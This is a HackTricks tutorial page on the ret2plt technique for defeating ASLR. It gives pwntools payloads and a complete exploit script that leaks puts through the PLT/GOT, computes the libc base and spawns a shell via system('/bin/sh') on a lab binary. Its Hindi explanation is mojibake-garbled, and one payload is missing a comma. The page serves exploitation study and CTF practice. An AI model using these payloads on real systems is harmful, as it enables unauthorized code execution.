# Ret2plt

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реЛрдЧрд╛ рдХрд┐рд╕реА **PLT рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд░рдирд╛** рддрд╛рдХрд┐ ASLR рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдЖрдк, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `puts` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ libc рд╕реЗ рд▓реАрдХ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдлрд┐рд░ рдЖрдк **`libc` рдХрд╛ рдмреЗрд╕ рдХрд╣рд╛рдБ рд╣реИ рдФрд░ рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдЬреИрд╕реЗ `system` рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдСрдлрд╕реЗрдЯ рдХреА рдЧрдгрдирд╛** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ `pwntools` рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ ([**рдпрд╣рд╛рдБ рд╕реЗ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Note рдХрд░реЗрдВ рдХрд┐ **`puts`** (PLT рд╕реЗ рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ) `puts` рдХрд╛ рдкрддрд╛ GOT рдореЗрдВ рд╕реНрдерд┐рдд `puts` рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `puts` рдЬрдм `puts` рдХрд╛ GOT рдПрдВрдЯреНрд░реА рдкреНрд░рд┐рдВрдЯ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ **рдПрдВрдЯреНрд░реА рдореЗрдореЛрд░реА рдореЗрдВ `puts` рдХрд╛ рд╕рдЯреАрдХ рдкрддрд╛ рд░рдЦреЗрдЧреА**ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдореЗрдВ `main` рдХрд╛ рдкрддрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЬрдм `puts` рдЕрдкрдирд╛ рдХрд╛рд░реНрдп рд╕рдорд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, **рдмрд╛рдЗрдирд░реА `main` рдХреЛ рдлрд┐рд░ рд╕реЗ рдмреБрд▓рд╛рддрд╛ рд╣реИ рдмрдЬрд╛рдп рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ** (рддрд╛рдХрд┐ рд▓реАрдХ рд╣реБрдЖ рдкрддрд╛ рд╡реИрдз рд░рд╣реЗ)ред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдмрд╛рдЗрдирд░реА рдХреЛ PIE рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛** рдпрд╛ рдЖрдкрдХреЛ **PIE рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд▓реАрдХ рдкрд╛рдирд╛ рд╣реЛрдЧрд╛** рддрд╛рдХрд┐ PLT, GOT рдФрд░ main рдХрд╛ рдкрддрд╛ рдкрддрд╛ рдЪрд▓реЗред рдЕрдиреНрдпрдерд╛, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ PIE рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
{% endhint %}

рдЖрдк рдпрд╣рд╛рдБ [**рдЗрд╕ рдмрд╛рдЗрдкрд╛рд╕ рдХрд╛ рдкреВрд░рд╛ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)ред рдпрд╣ рдЙрд╕ **рдЙрджрд╛рд╣рд░рдг** рдХрд╛ рдЕрдВрддрд┐рдо рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдерд╛ред
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд╣реИ рд▓реЗрдХрд┐рди PIE рдирд╣реАрдВ рд╣реИ, рдкрд╣рд▓рд╛ рдХрджрдо рд╣реИ рдХреИрдиреЗрд░реА рдХреЗ 0x00 рдмрд╛рдЗрдЯ рддрдХ рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рднрд░рдирд╛ рдФрд░ рдлрд┐рд░ puts рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдЗрд╕реЗ рд▓реАрдХ рдХрд░рдирд╛ред рдХреИрдиреЗрд░реА рдХреЗ рд╕рд╛рде рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ puts рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП GOT рд╕реЗ puts рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдФрд░ рдлрд┐рд░ `system('/bin/sh')` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо, рдХреЛрдИ рдХреИрдиреЗрд░реА рдирд╣реАрдВ, рдореБрдЦреНрдп рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ рдореЗрдВ рдПрдХ рдЪрд╛рдЗрд▓реНрдб рдлрд╝рдВрдХреНрд╢рди рд╕реЗред puts рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЧреИрдЬреЗрдЯ рдЬрд┐рд╕рд╕реЗ GOT рд╕реЗ puts рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдФрд░ рдлрд┐рд░ рдПрдХ рд╡рди рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред
